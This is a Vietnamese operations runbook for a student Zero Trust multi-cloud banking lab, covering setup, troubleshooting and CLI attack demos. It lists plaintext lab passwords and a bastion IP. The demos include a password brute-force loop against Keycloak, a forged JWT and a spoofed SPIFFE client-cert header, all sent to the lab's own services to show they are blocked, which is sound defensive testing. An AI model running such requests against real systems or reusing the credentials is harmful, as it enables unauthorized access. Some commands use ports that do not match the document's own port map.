# ZTLab — Hướng Dẫn Vận Hành Từ A–Z

> **Đồ án:** Triển khai Hệ thống Phát hiện và Phản ứng Sự cố Bảo mật Dựa trên Zero Trust cho Microservices trong Multi-Cloud  
> **Sinh viên:** Hoàng Bảo Phước (23521231) · Phạm Võ Khánh Hà (23520414)

---

## Thông tin hạ tầng

### EC2 Instances

| Tên | Instance ID | IP Private | Vai trò |
|-----|-------------|-----------|---------|
| **aws-bastion** | `i-06d2382ad780bda8c` | 10.10.4.10 | SSH jump host — **EIP tĩnh 54.254.252.106** |
| **aws-k3s-master** | `i-0293f9568b3c0762b` | 10.10.1.10 | AWS K3s control plane |
| **aws-k3s-worker-1** | `i-00001195627942100` | 10.10.1.11 | AWS K3s worker node |
| **os-k3s-master** | `i-08f1cf418461cca62` | 10.10.1.12 | OpenStack K3s (single node) |

> Instance khác (`aws-gateway`, `aws-security`, `aws-siem`) không dùng cho lab — bỏ qua.

### Kiến trúc multi-cloud

```
         ┌──────────────── AWS K3s (10.10.1.10 / .11) ────────────────┐
Browser ──► Keycloak (JWT)                                              │
         │  api-gateway ──► OPA (authz) ──► payment-service           │
         │  fraud-detection, notification-service, redis               │
         │  web-portal (UI)                                            │
         └───────────────────────┬─────────────────────────────────────┘
                                 │  mTLS qua SPIRE SVID
                                 │  port 30081 (NodePort OpenStack)
         ┌───────────────────────▼─────────────────────────────────────┐
         │       OpenStack K3s (10.10.1.12) — single node              │
         │  core-banking (Envoy sidecar) ──► OPA (cross-cloud)        │
         │  account-service ──► postgres-accounts                      │
         │  transaction-service ──► postgres-txn                       │
         └─────────────────────────────────────────────────────────────┘
```

### Flow thanh toán cross-cloud

```
[Browser / Web Portal]
     │  JWT Bearer token (Keycloak OIDC RS256)
     ▼
[api-gateway (AWS)]  — rate limit + JWT verify + trace_id
     ▼
[Envoy sidecar payment-service]  — ext_authz → OPA (SVID + path + method)
     ▼
[payment-service (AWS)]
     │  validate amount ≤ 500M VND
     │  gọi fraud-detection /score (velocity + amount + channel)
     │  nếu score < 75 → X-Fraud-Gate=passed
     ▼
[Envoy upstream 10.10.1.12:30081]  — mTLS cross-cloud
     │  SPIFFE: spiffe://ztlab.local/aws/payment-service
     ▼
[core-banking Envoy (OpenStack)]
     │  OPA cross_cloud policy: chỉ nhận SVID đúng + fraud gate passed
     ▼
[core-banking app]
     │  ghi transaction, gọi account-service + transaction-service
     ▼
{status, trace_id, fraud, core_banking}
```

### Flow AI-SOAR-TheHive (HITL)

```
Envoy/OPA/App logs
     │ Promtail → Loki
     ▼
AI Analyzer — poll Loki mỗi 120s bằng LogQL
     │ medium   → log vào Loki, không làm gì thêm
     │ high/critical → tạo pending alert (in-memory)
     │               + tạo TheHive alert
     │               + push Loki {pending_approval="true"}
     ▼
Grafana rule "ai-pending-approval-alert"
     │ Condition: {pending_approval="true"} trong 2 phút > 0
     │ → fire → Contact Point "ztlab-security-admin"
     │          (Email / Slack / Telegram / Webhook — cấu hình trong UI)
     ▼
Admin xem Web Portal /alerts
     │ approve  → AI tạo TheHive case → gọi SOAR
     │ dismiss  → ghi lý do, không tác động workload
     ▼
SOAR Engine
     │ isolate_workload    → patch Service selector
     │ restrict_egress     → patch NetworkPolicy
     │ quarantine_workload → scale Deployment replicas=0
     ▼
Audit trail → /data/cases.jsonl + Loki
```

### Credentials

| Dịch vụ | User | Password |
|---------|------|----------|
| Grafana | admin | ZTALab2026! |
| Keycloak Admin | admin | ztlab-admin-2026 |
| TheHive Admin | admin@thehive.local | secret |
| TheHive AI user | ai-soar2@ztlab.local | API key trong secret `ai-secrets` |
| testuser01 (ACC-1001) | testuser01 | Test1234! |
| merchant01 (ACC-2001) | merchant01 | Merchant1234! |
| analyst01 | analyst01 | Analyst1234! |

### Kubectl contexts

| Context | Local port | Trỏ đến |
|---------|-----------|---------|
| `ctx-aws` | localhost:6444 | 10.10.1.10:6443 (AWS K3s) |
| `ctx-openstack` | localhost:6445 | 10.10.1.12:6443 (OpenStack K3s) |

### Port-forward map

| Port local | Namespace | Service | Mục đích | URL |
|-----------|-----------|---------|---------|-----|
| **8080** | financial | web-portal | **Web Portal UI** | http://localhost:8080 |
| 8180 | identity | keycloak | Keycloak OIDC/Admin | http://localhost:8180 |
| 18080 | financial | api-gateway | API Gateway (REST) | http://localhost:18080 |
| 3000 | plg-stack | grafana | Grafana dashboards | http://localhost:3000 |
| 8090 | plg-stack | ai-analyzer | AI Analyzer API | http://localhost:8090 |
| 8091 | plg-stack | soar-engine | SOAR Engine API | http://localhost:8091 |
| 3100 | plg-stack | loki | Loki query | http://localhost:3100 |
| 9000 | plg-stack | thehive | TheHive | http://localhost:9000 |

---

## Phần 1 — Khởi động từ đầu (sau khi bật EC2)

### Bước 1 — Kiểm tra và bật EC2

```bash
# Kiểm tra trạng thái
aws ec2 describe-instances --region ap-southeast-1 \
  --instance-ids \
    i-06d2382ad780bda8c \
    i-0293f9568b3c0762b \
    i-00001195627942100 \
    i-08f1cf418461cca62 \
  --query 'Reservations[].Instances[].[Tags[?Key==`Name`].Value|[0], State.Name, PublicIpAddress]' \
  --output table
```

Nếu có instance `stopped`:
```bash
aws ec2 start-instances --region ap-southeast-1 \
  --instance-ids \
    i-06d2382ad780bda8c \
    i-0293f9568b3c0762b \
    i-00001195627942100 \
    i-08f1cf418461cca62

# Chờ ~3 phút để K3s khởi động hoàn toàn
aws ec2 wait instance-running --region ap-southeast-1 \
  --instance-ids i-0293f9568b3c0762b i-00001195627942100 i-08f1cf418461cca62
echo "EC2 running — đợi thêm 2 phút cho K3s..."
sleep 120
```

> EIP bastion `54.254.252.106` là tĩnh, không đổi dù restart.

---

### Bước 2 — Mở SSH tunnel kubectl

```bash
# Đóng tunnel cũ nếu có
pkill -f "ssh.*6444\|ssh.*6445" 2>/dev/null; sleep 1

# Mở tunnel AWS K3s (port 6444)
ssh -f -N \
  -i ~/.ssh/zta-siem-soar-key \
  -o StrictHostKeyChecking=no \
  -o ServerAliveInterval=30 \
  -L 6444:10.10.1.10:6443 \
  -J ubuntu@54.254.252.106 \
  ubuntu@10.10.1.10

# Mở tunnel OpenStack K3s (port 6445)
ssh -f -N \
  -i ~/.ssh/zta-siem-soar-key \
  -o StrictHostKeyChecking=no \
  -o ServerAliveInterval=30 \
  -L 6445:10.10.1.12:6443 \
  -J ubuntu@54.254.252.106 \
  ubuntu@10.10.1.12

sleep 3

# Kiểm tra kết nối
kubectl --context ctx-aws get nodes
kubectl --context ctx-openstack get nodes
```

Output mong đợi:
```
NAME            STATUS   ROLES                  AGE
ip-10-10-1-10   Ready    control-plane,master   ...
ip-10-10-1-11   Ready    <none>                 ...

NAME        STATUS   ROLES                       AGE
os-master   Ready    control-plane,etcd,master   ...
```

Nếu worker `ip-10-10-1-11` là NotReady → xem [Bước 3.3](#33--kiểm-tra-worker-node-aws).

---

### Bước 3 — Mở port-forward

```bash
# Đóng port-forward cũ trước
pkill -f "kubectl.*port-forward" 2>/dev/null; sleep 1

# Mở tất cả (nohup để không bị kill khi đóng terminal)
nohup kubectl --context ctx-aws port-forward svc/web-portal  8080:8080 -n financial  >/tmp/pf-web.log 2>&1 &
nohup kubectl --context ctx-aws port-forward svc/keycloak    8180:8080 -n identity   >/tmp/pf-kc.log 2>&1 &
nohup kubectl --context ctx-aws port-forward svc/api-gateway 18080:8080 -n financial >/tmp/pf-gw.log 2>&1 &
nohup kubectl --context ctx-aws port-forward svc/grafana     3000:3000 -n plg-stack  >/tmp/pf-grafana.log 2>&1 &
nohup kubectl --context ctx-aws port-forward svc/ai-analyzer 8090:8080 -n plg-stack  >/tmp/pf-ai.log 2>&1 &
nohup kubectl --context ctx-aws port-forward svc/soar-engine 8091:8080 -n plg-stack  >/tmp/pf-soar.log 2>&1 &
nohup kubectl --context ctx-aws port-forward svc/loki        3100:3100 -n plg-stack  >/tmp/pf-loki.log 2>&1 &
nohup kubectl --context ctx-aws port-forward svc/thehive     9000:9000 -n plg-stack  >/tmp/pf-hive.log 2>&1 &

sleep 4

echo "=== Kiểm tra health ==="
curl -sf http://localhost:8080/health \
  | python3 -c "import json,sys; print('Web Portal:', json.load(sys.stdin)['status'])"
curl -sf http://localhost:18080/health \
  | python3 -c "import json,sys; d=json.load(sys.stdin); print('API Gateway:', d['status'], '|', d['cloud'])"
curl -sf http://localhost:8180/realms/ztlab/.well-known/openid-configuration \
  | python3 -c "import json,sys; print('Keycloak issuer:', json.load(sys.stdin)['issuer'])"
curl -sf http://localhost:3000/api/health \
  | python3 -c "import json,sys; print('Grafana:', json.load(sys.stdin).get('database','ok'))"
curl -sf http://localhost:8090/health \
  | python3 -c "import json,sys; d=json.load(sys.stdin); print('AI Analyzer:', d['status'], '| pending:', d.get('pending_alerts_count',0))"
curl -sf http://localhost:8091/health \
  | python3 -c "import json,sys; d=json.load(sys.stdin); print('SOAR:', d['status'], '| dry_run:', d.get('dry_run'), '| cases:', d.get('case_count',0))"
curl -sf http://localhost:9000/api/status \
  | python3 -c "import json,sys; print('TheHive:', json.load(sys.stdin).get('versions',{}).get('TheHive','?'))" 2>/dev/null \
  || echo "TheHive: khởi động chậm — thử lại sau 2 phút"
```

Output mong đợi:
```
Web Portal: ok
API Gateway: ok | aws
Keycloak issuer: http://keycloak.ztlab.local/realms/ztlab
Grafana: ok
AI Analyzer: ok | pending: 0
SOAR: ok | dry_run: False | cases: 137
TheHive: 5.2.16-1
```

---

### Bước 4 — Kiểm tra tất cả pods

```bash
echo "=== AWS — financial ==="
kubectl --context ctx-aws get pods -n financial

echo ""
echo "=== AWS — identity ==="
kubectl --context ctx-aws get pods -n identity

echo ""
echo "=== AWS — plg-stack ==="
kubectl --context ctx-aws get pods -n plg-stack

echo ""
echo "=== OpenStack — financial ==="
kubectl --context ctx-openstack get pods -n financial
```

**AWS financial — phải có (Running):**
- `api-gateway` 2/2, `payment-service` 2/2, `fraud-detection` 2/2
- `notification-service` 2/2, `opa-server` 1/1
- `redis`, `web-portal`, `postgres-accounts`, `postgres-txn`

**AWS identity:**
- `keycloak`, `keycloak-db`

**AWS plg-stack:**
- `loki`, `grafana`, `promtail`, `ai-analyzer`, `soar-engine`
- `thehive`, `thehive-cassandra`

**OpenStack financial:**
- `core-banking` 2/2 (Envoy sidecar), `opa-server` 1/1
- `account-service`, `transaction-service`
- `postgres-accounts`, `postgres-txn`

Pod không Running → xem [Phần 4 Xử lý sự cố](#phần-4--xử-lý-sự-cố-thường-gặp).

---

### Bước 5 — Kiểm tra cross-cloud mTLS (bắt buộc)

```bash
TOKEN=$(curl -s -X POST http://localhost:18443/realms/ztlab/protocol/openid-connect/token \
  -d "grant_type=password&client_id=web-portal&username=testuser01&password=Test1234!" \
  | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token','ERROR'))")

curl -s -X POST http://localhost:18080/payments \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"from_account":"ACC-1001","to_account":"ACC-2001","amount":100000,"currency":"VND"}' \
  | python3 -m json.tool
```

Output mong đợi:
```json
{
  "status": "completed",
  "trace_id": "...",
  "fraud": {"score": 5, "verdict": "allow", "gate": "passed"},
  "core_banking": {"transaction_id": "...", "status": "completed"}
}
```

Xác nhận SVID trong Envoy OpenStack:
```bash
kubectl --context ctx-openstack logs -n financial -l app=core-banking -c envoy --since=1m \
  | python3 -c "
import sys, json
for line in sys.stdin:
    try:
        d = json.loads(line)
        if d.get('response_code') == 200:
            print('SVID:', d.get('svid'), '| code:', d.get('response_code'))
    except: pass
"
# Mong đợi: spiffe://ztlab.local/aws/payment-service | code: 200
```

**Hệ thống sẵn sàng** khi trả về `status: completed`.

---

## Phần 2 — Sau khi restart máy local (EC2 vẫn chạy)

```bash
# 1. Kiểm tra bastion còn sống
ssh -i ~/.ssh/zta-siem-soar-key -o ConnectTimeout=8 ubuntu@54.254.252.106 "echo bastion OK"

# 2. Kiểm tra pods còn Running không (không cần tunnel để xem nếu tunnel cũ còn)
kubectl --context ctx-aws get pods -n financial --no-headers | grep -v Running
kubectl --context ctx-openstack get pods -n financial --no-headers | grep -v Running
# Không có output → tất cả Running

# 3. Mở lại tunnel (Bước 2)
# 4. Mở lại port-forward (Bước 3)
# 5. Test cross-cloud (Bước 5)
```

---

## Phần 3 — Sau khi EC2 bị stop (restart hoàn toàn)

### 3.1 — Bật EC2 và chờ

```bash
aws ec2 start-instances --region ap-southeast-1 \
  --instance-ids \
    i-06d2382ad780bda8c \
    i-0293f9568b3c0762b \
    i-00001195627942100 \
    i-08f1cf418461cca62

# Chờ instance running rồi đợi thêm 2 phút cho K3s
aws ec2 wait instance-running --region ap-southeast-1 \
  --instance-ids i-0293f9568b3c0762b i-00001195627942100 i-08f1cf418461cca62
sleep 120
```

Sau đó làm Phần 1 từ Bước 2.

---

### 3.2 — Fix SPIRE agent OpenStack (hay bị crash sau restart)

Sau khi restart, SPIRE agent OpenStack thường crash vì **join token hết hạn**. Đây là lỗi phổ biến nhất.

```bash
# Kiểm tra
kubectl --context ctx-openstack get pods -n spire
# Nếu thấy CrashLoopBackOff hoặc Error → cần fix
```

**Cách fix:**

```bash
# B1 — Tạo join token mới từ SPIRE server AWS
SPIRE_SERVER=$(kubectl --context ctx-aws get pod -n spire -l app=spire-server \
  -o jsonpath='{.items[0].metadata.name}')

NEW_TOKEN=$(kubectl --context ctx-aws exec -n spire $SPIRE_SERVER \
  -- /opt/spire/bin/spire-server token generate 2>&1 | grep "Token:" | awk '{print $2}')
echo "Token mới: $NEW_TOKEN"

# B2 — Đăng ký SPIRE entries cho OpenStack workloads
PARENT="spiffe://ztlab.local/spire/agent/join_token/$NEW_TOKEN"

for ENTRY in \
  "openstack/core-banking:core-banking" \
  "openstack/account-service:account-service" \
  "openstack/transaction-service:transaction-service"; do
  SPIFFE="${ENTRY%%:*}"
  SA="${ENTRY##*:}"
  kubectl --context ctx-aws exec -n spire $SPIRE_SERVER -- \
    /opt/spire/bin/spire-server entry create \
    -spiffeID "spiffe://ztlab.local/$SPIFFE" \
    -parentID "$PARENT" \
    -selector "k8s:ns:financial" \
    -selector "k8s:sa:$SA" \
    -ttl 3600 2>&1 | grep "SPIFFE ID"
done

# B3 — Cập nhật join token trong DaemonSet OpenStack
kubectl --context ctx-openstack patch daemonset spire-agent -n spire \
  --type='json' \
  -p="[{\"op\":\"replace\",\"path\":\"/spec/template/spec/containers/0/args\",\"value\":[\"-config\",\"/run/spire/config/agent.conf\",\"-joinToken\",\"${NEW_TOKEN}\"]}]"

# B4 — Chờ rollout
kubectl --context ctx-openstack rollout status daemonset/spire-agent -n spire --timeout=90s

# B5 — Xác nhận attest thành công
kubectl --context ctx-openstack logs -n spire daemonset/spire-agent --tail=5
# Mong đợi: "Node attestation was successful"

# B6 — Restart core-banking để Envoy lấy SVID mới
kubectl --context ctx-openstack rollout restart deployment/core-banking -n financial
kubectl --context ctx-openstack rollout status deployment/core-banking -n financial --timeout=60s

# B7 — Xác nhận SVID cấp
kubectl --context ctx-openstack logs -n spire daemonset/spire-agent --since=2m \
  | grep "Creating X509-SVID"
# Mong đợi: spiffe://ztlab.local/openstack/core-banking
```

---

### 3.3 — Kiểm tra worker node AWS

```bash
kubectl --context ctx-aws get nodes
# Nếu ip-10-10-1-11 là NotReady:

aws ec2 stop-instances  --region ap-southeast-1 --instance-ids i-00001195627942100
aws ec2 wait instance-stopped --region ap-southeast-1 --instance-ids i-00001195627942100
aws ec2 start-instances --region ap-southeast-1 --instance-ids i-00001195627942100
aws ec2 wait instance-running --region ap-southeast-1 --instance-ids i-00001195627942100

sleep 60
kubectl --context ctx-aws get nodes
# ip-10-10-1-11 phải là Ready
```

---

## Phần 4 — Xử lý sự cố thường gặp

### Kiểm tra nhanh toàn hệ thống

```bash
echo "=== Nodes ==="
kubectl --context ctx-aws get nodes --no-headers | awk '{print "AWS", $1, $2}'
kubectl --context ctx-openstack get nodes --no-headers | awk '{print "OS ", $1, $2}'

echo ""
echo "=== Pods không Running ==="
kubectl --context ctx-aws get pods -A --no-headers | grep -v "Running\|Completed" | head -20
kubectl --context ctx-openstack get pods -A --no-headers | grep -v "Running\|Completed" | head -10

echo ""
echo "=== Services health ==="
for svc in "8080:/health" \
           "18080:/health" \
           "8180:/realms/ztlab" \
           "3000:/api/health" \
           "8090:/health" \
           "8091:/health" \
           "9000:/api/status"; do
  port="${svc%%:*}"; path="${svc##*:}"
  code=$(curl -so /dev/null -w "%{http_code}" "http://localhost:$port$path")
  echo "  :$port $path → HTTP $code"
done
```

---

### Restart từng service

#### Restart API Gateway
```bash
kubectl --context ctx-aws rollout restart deployment/api-gateway -n financial
kubectl --context ctx-aws rollout status deployment/api-gateway -n financial --timeout=60s
curl -sf http://localhost:18080/health | python3 -c "import json,sys; print(json.load(sys.stdin)['status'])"
```

#### Restart Payment Service
```bash
kubectl --context ctx-aws rollout restart deployment/payment-service -n financial
kubectl --context ctx-aws rollout status deployment/payment-service -n financial --timeout=60s
```

#### Restart Core Banking (OpenStack)
```bash
kubectl --context ctx-openstack rollout restart deployment/core-banking -n financial
kubectl --context ctx-openstack rollout status deployment/core-banking -n financial --timeout=60s
```

#### Restart Account Service (OpenStack)
```bash
kubectl --context ctx-openstack rollout restart deployment/account-service -n financial
kubectl --context ctx-openstack rollout restart deployment/transaction-service -n financial
```

#### Restart Keycloak
```bash
kubectl --context ctx-aws rollout restart deployment/keycloak -n identity
kubectl --context ctx-aws rollout status deployment/keycloak -n identity --timeout=120s
# Keycloak khởi động lâu (~60s)
curl -sf http://localhost:18443/realms/ztlab/.well-known/openid-configuration \
  | python3 -c "import json,sys; print('issuer:', json.load(sys.stdin)['issuer'])"
```

#### Restart AI Analyzer
```bash
kubectl --context ctx-aws rollout restart deployment/ai-analyzer -n plg-stack
kubectl --context ctx-aws rollout status deployment/ai-analyzer -n plg-stack --timeout=60s
curl -sf http://localhost:18082/health | python3 -m json.tool
```

#### Restart SOAR Engine
```bash
kubectl --context ctx-aws rollout restart deployment/soar-engine -n plg-stack
kubectl --context ctx-aws rollout status deployment/soar-engine -n plg-stack --timeout=60s
curl -sf http://localhost:18091/health | python3 -c "import json,sys; d=json.load(sys.stdin); print('SOAR:', d['status'], '| dry_run:', d.get('dry_run'))"
```

#### Restart Grafana
```bash
kubectl --context ctx-aws rollout restart deployment/grafana -n plg-stack
kubectl --context ctx-aws rollout status deployment/grafana -n plg-stack --timeout=90s
# Đóng và mở lại port-forward port 3000 sau khi restart
```

#### Restart Loki
```bash
kubectl --context ctx-aws rollout restart deployment/loki -n plg-stack
kubectl --context ctx-aws rollout status deployment/loki -n plg-stack --timeout=90s
```

#### Restart TheHive (cẩn thận — mất data in-memory nếu không dùng Cassandra)
```bash
# Kiểm tra Cassandra trước
kubectl --context ctx-aws get pods -n plg-stack -l app=thehive-cassandra

kubectl --context ctx-aws rollout restart deployment/thehive -n plg-stack
kubectl --context ctx-aws rollout status deployment/thehive -n plg-stack --timeout=180s
# TheHive khởi động lâu (~2 phút vì chờ Cassandra)
```

#### Restart OPA (AWS)
```bash
kubectl --context ctx-aws rollout restart deployment/opa-server -n financial
kubectl --context ctx-aws rollout status deployment/opa-server -n financial --timeout=60s
# OPA trên AWS xử lý JWT/SVID cho payment pipeline

# Kiểm tra policy đang load đúng
kubectl --context ctx-aws exec -n financial \
  $(kubectl --context ctx-aws get pod -n financial -l app=opa-server -o jsonpath='{.items[0].metadata.name}') \
  -- curl -s http://localhost:8181/v1/policies | python3 -c "
import json, sys
d = json.load(sys.stdin)
for p in d.get('result', []):
    print('Policy:', p.get('id'))
"
```

#### Restart OPA (OpenStack)
```bash
kubectl --context ctx-openstack rollout restart deployment/opa-server -n financial
kubectl --context ctx-openstack rollout status deployment/opa-server -n financial --timeout=60s
```

---

### Sự cố: Keycloak trả về issuer sai

```bash
curl -s http://localhost:18443/realms/ztlab/.well-known/openid-configuration \
  | python3 -c "import json,sys; print(json.load(sys.stdin)['issuer'])"
# Phải là: http://keycloak.ztlab.local/realms/ztlab

# Nếu sai — kiểm tra env
kubectl --context ctx-aws get deployment keycloak -n identity \
  -o jsonpath='{.spec.template.spec.containers[0].env}' \
  | python3 -c "import json,sys; [print(e['name'],'=',e.get('value','')) for e in json.load(sys.stdin) if 'KC_HOSTNAME' in e['name'] or 'KC_DB' in e['name']]"

# Fix:
kubectl --context ctx-aws set env deployment/keycloak -n identity \
  KC_HOSTNAME=keycloak.ztlab.local \
  KC_DB_USERNAME=keycloak \
  KC_HOSTNAME_STRICT=false \
  KC_PROXY=edge
kubectl --context ctx-aws rollout status deployment/keycloak -n identity --timeout=120s
```

---

### Sự cố: Cross-cloud payment lỗi TLS / 503

```bash
# 1. Kiểm tra port 30081 có mở không
kubectl --context ctx-aws exec -n financial \
  $(kubectl --context ctx-aws get pod -n financial -l app=payment-service -o jsonpath='{.items[0].metadata.name}') \
  -c payment-service -- python3 -c "
import socket
s = socket.socket(); s.settimeout(5)
r = s.connect_ex(('10.10.1.12', 30081))
print('30081:', 'OPEN' if r==0 else f'CLOSED rc={r}')
"

# 2. Kiểm tra Envoy configmap trỏ đúng IP OpenStack
kubectl --context ctx-aws get configmap envoy-config -n financial -o yaml \
  | grep -A5 "name: core_banking" | grep -E "address:|port_value:"
# Phải là: address: 10.10.1.12 | port_value: 30081

# Nếu sai — apply lại
kubectl --context ctx-aws apply -f envoy/configmap.yaml
kubectl --context ctx-aws rollout restart deployment/payment-service deployment/api-gateway -n financial

# 3. Kiểm tra SPIRE agent OpenStack
kubectl --context ctx-openstack get pods -n spire
kubectl --context ctx-openstack logs -n spire daemonset/spire-agent --tail=5
# Nếu crash → xem Bước 3.2
```

---

### Sự cố: Port-forward bị ngắt

```bash
# Xem port nào đang mở
lsof -i -P -n 2>/dev/null | grep LISTEN \
  | grep -E ":6444|:6445|:8080|:18080|:18443|:3000|:18082|:18091|:19000|:13100"

# Kill tất cả kubectl port-forward cũ
pkill -f "kubectl.*port-forward" 2>/dev/null; sleep 1

# Mở lại (dùng script ở Bước 3)
```

---

### Sự cố: TheHive không tạo alert (thehive_configured=true nhưng alert_id=null)

Nguyên nhân thường gặp: API key thiếu quyền `manageAlert/create` trong org `ztlab`.

```bash
# Kiểm tra key còn hoạt động
THEHIVE_KEY=$(kubectl --context ctx-aws -n plg-stack get secret ai-secrets \
  -o jsonpath='{.data.THEHIVE_API_KEY}' | base64 -d)

curl -s -o /dev/null -w "%{http_code}" \
  -H "Authorization: Bearer ${THEHIVE_KEY}" \
  http://localhost:19000/api/v1/alert
# 200 hoặc 400 → key OK; 403 → key sai quyền

# Tạo lại user integration nếu cần
ADMIN_KEY=$(curl -s -u 'admin@thehive.local:secret' \
  http://localhost:19000/api/v1/user/~8208/key | python3 -c "import json,sys; print(json.load(sys.stdin)['key'])")

# Tạo org nếu chưa có
curl -s -X POST http://localhost:19000/api/v0/organisation \
  -H "Authorization: Bearer ${ADMIN_KEY}" \
  -H "Content-Type: application/json" \
  -d '{"name":"ztlab","description":"ZTLab","taskRule":"manual","observableRule":"manual"}'

# Tạo user analyst trong org ztlab
USER_RESP=$(curl -s -X POST http://localhost:19000/api/v1/user \
  -H "Authorization: Bearer ${ADMIN_KEY}" \
  -H "Content-Type: application/json" \
  -d '{"login":"ai-soar2@ztlab.local","name":"AI SOAR","organisation":"ztlab","profile":"analyst","type":"Normal"}')
USER_ID=$(echo $USER_RESP | python3 -c "import json,sys; print(json.load(sys.stdin).get('_id',''))")

NEW_KEY=$(curl -s -X POST -H "Authorization: Bearer ${ADMIN_KEY}" \
  "http://localhost:19000/api/v1/user/${USER_ID}/key/renew")

# Gắn key mới vào AI secret
kubectl --context ctx-aws -n plg-stack patch secret ai-secrets --type merge \
  -p "{\"stringData\":{\"THEHIVE_API_KEY\":\"${NEW_KEY}\",\"THEHIVE_URL\":\"http://thehive.plg-stack.svc.cluster.local:9000\",\"THEHIVE_ORG\":\"ztlab\"}}"
kubectl --context ctx-aws -n plg-stack rollout restart deployment/ai-analyzer
kubectl --context ctx-aws -n plg-stack rollout status deployment/ai-analyzer --timeout=180s
```

---

### Sự cố: Pod CrashLoopBackOff

```bash
# Xem nguyên nhân
kubectl --context ctx-aws describe pod -n <ns> <pod> | grep -A10 "Events:"
kubectl --context ctx-aws logs -n <ns> <pod> --previous --tail=30

# Restart
kubectl --context ctx-aws rollout restart deployment/<name> -n <ns>
```

---

## Truy cập nhanh các UI

| UI | URL (sau khi port-forward) | Đăng nhập |
|----|---------------------------|-----------|
| **Web Portal** | http://localhost:8080 | testuser01 / Test1234! |
| **Grafana** | http://localhost:3000 | admin / ZTALab2026! |
| **Keycloak Admin** | http://localhost:8180/admin | admin / ztlab-admin-2026 |
| **AI Analyzer API** | http://localhost:8090/docs | — |
| **SOAR Engine API** | http://localhost:8091/docs | — |
| **TheHive** | http://localhost:9000 | admin@thehive.local / secret |

> **Xem hướng dẫn Web Portal đầy đủ:** [Phần 5 — Web Portal UI](#phần-5--sử-dụng-web-portal-ui)

**Grafana dashboards có sẵn:**
- `ZTLab Security Overview` — tổng quan toàn hệ thống
- `Envoy Access Logs` — log mTLS Envoy
- `OPA Decision Log` — quyết định OPA allow/deny
- `AI SIEM SOAR` — AI alerts, SOAR cases, TheHive cases
- `ZTLab Threat Intelligence Feed` — MITRE ATT&CK heatmap, top IPs, verdict distribution

---

## Demo kịch bản tấn công (CLI)

> **Chuẩn bị:** Bước 1–5 (Phần 1) phải hoàn tất. Lấy TOKEN một lần dùng cho mọi demo:
> ```bash
> TOKEN=$(curl -s -X POST http://localhost:18443/realms/ztlab/protocol/openid-connect/token \
>   -d "grant_type=password&client_id=web-portal&username=testuser01&password=Test1234!" \
>   | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token','ERR'))")
> ```

---

### Demo 1 — Giao dịch bình thường (baseline)

```bash
curl -s -X POST http://localhost:18080/payments \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"from_account":"ACC-1001","to_account":"ACC-2001","amount":100000,"currency":"VND"}' \
  | python3 -m json.tool
```

Kiểm tra trace_id xuyên cloud trong Loki:
```bash
TRACE=$(curl -s -X POST http://localhost:18080/payments \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"from_account":"ACC-1001","to_account":"ACC-2001","amount":50000,"currency":"VND"}' \
  | python3 -c "import json,sys; print(json.load(sys.stdin).get('trace_id',''))")

echo "trace_id: $TRACE"
# Tìm trace này trong Grafana Explore:
# {job="kubernetes-pods", namespace="financial"} |= "<trace_id>"
```

**Điểm nhấn:** `trace_id` giống nhau trong log AWS (payment-service) và OpenStack (core-banking) — chứng minh truy vết xuyên cloud.

---

### Demo 2 — Từ chối không có JWT (T1078 — OPA deny)

```bash
curl -s -X POST http://localhost:18080/payments \
  -H "Content-Type: application/json" \
  -d '{"from_account":"ACC-1001","to_account":"ACC-2001","amount":100000}' \
  | python3 -m json.tool
# → HTTP 403 Forbidden
```

Xác nhận OPA log:
```bash
kubectl --context ctx-aws logs -n financial -l app=opa-server --since=1m \
  | grep "deny\|false" | tail -3
```

---

### Demo 3 — Brute Force đăng nhập (T1110)

20 lần thử Keycloak với sai mật khẩu:
```bash
for i in $(seq 1 20); do
  code=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST http://localhost:18443/realms/ztlab/protocol/openid-connect/token \
    -d "grant_type=password&client_id=web-portal&username=admin&password=wrong$i")
  printf "attempt %-2s → %s\n" "$i" "$code"
done
# → 20x 401
```

Kiểm tra AI phát hiện:
```bash
curl -s -X POST http://localhost:18082/analyze \
  -H "Content-Type: application/json" \
  -d "{
    \"source\": \"demo3-brute-force\",
    \"logs\": [
      {\"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\",
       \"message\": \"login_failed invalid_credentials attempt=20 username=admin source_ip=10.9.8.1 brute_force_detected\",
       \"labels\": {\"namespace\": \"identity\", \"app\": \"keycloak\", \"job\": \"kubernetes-pods\"}}
    ]
  }" | python3 -c "import json,sys; d=json.load(sys.stdin); print('verdict:', d['verdict'], '| severity:', d['severity'])"
```

---

### Demo 4 — JWT giả mạo (T1078.001)

JWT ký bằng sai secret key — API Gateway phải từ chối:
```bash
FAKE_JWT="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJoYWNrZXIiLCJleHAiOjk5OTk5OTk5OTl9.INVALIDSIGNATURE"

curl -s -o /dev/null -w "%{http_code}" \
  -X POST http://localhost:18080/payments \
  -H "Authorization: Bearer $FAKE_JWT" \
  -H "Content-Type: application/json" \
  -d '{"from_account":"ACC-1001","to_account":"ACC-2001","amount":1000}'
# → 401 Unauthorized
```

---

### Demo 5 — Lateral Movement qua SVID sai (T1021)

Gọi `payment-service/internal` với SVID của notification-service (sai):
```bash
curl -s -o /dev/null -w "%{http_code}" \
  -X POST http://localhost:18080/payments/internal/execute \
  -H "X-Forwarded-Client-Cert: URI=spiffe://ztlab.local/aws/notification-service" \
  -H "Content-Type: application/json" \
  -d '{"from_account":"ACC-1001","to_account":"ACC-9999","amount":999999999}'
# → 403 hoặc 404

# Kiểm tra OPA deny log
kubectl --context ctx-aws logs -n financial -l app=opa-server --since=1m | grep "deny"
```

---

### Demo 6 — Fraud gate block (T1078.002)

Giao dịch 500M VND qua kênh `tor` — fraud score = 75, bị block:
```bash
curl -s -X POST http://localhost:18080/payments \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"from_account":"ACC-1001","to_account":"ACC-2001","amount":500000000,"currency":"VND","channel":"tor"}' \
  | python3 -m json.tool
# → fraud.score=75, gate=blocked, HTTP 403
```

---

### Demo 7 — Data Exfiltration qua response size (T1030)

Inject log response lớn bất thường vào AI:
```bash
